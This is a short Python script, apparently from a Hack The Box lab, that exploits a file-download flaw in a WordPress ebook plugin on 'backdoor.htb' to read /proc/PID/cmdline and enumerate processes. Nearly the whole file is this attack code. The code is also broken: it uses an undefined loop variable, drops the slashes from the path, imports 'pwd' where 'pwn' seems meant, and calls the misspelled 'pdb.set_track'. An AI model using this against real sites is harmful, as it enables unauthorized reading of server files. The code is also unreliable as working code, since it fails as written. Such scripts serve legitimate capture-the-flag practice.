import requests
import signal
import time
import sys
import pdb

from pwd import *

def def_hundler(sig, frame):
    print("\n\n[!] Saliendo ...\n")
    sys.exit(1)

#Ctrl + C 
signal.signal(signal.SIGINT, def_hundler)

main_url = "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="

def makeRequest():
    # /proc/PID/cmdline
    url = main_url + "/proc" + str(i) + "cmdline"
    r = requests.get(url)

    pdb.set_track() # Debugging

if __name__ == '__main__':

    makeRequest()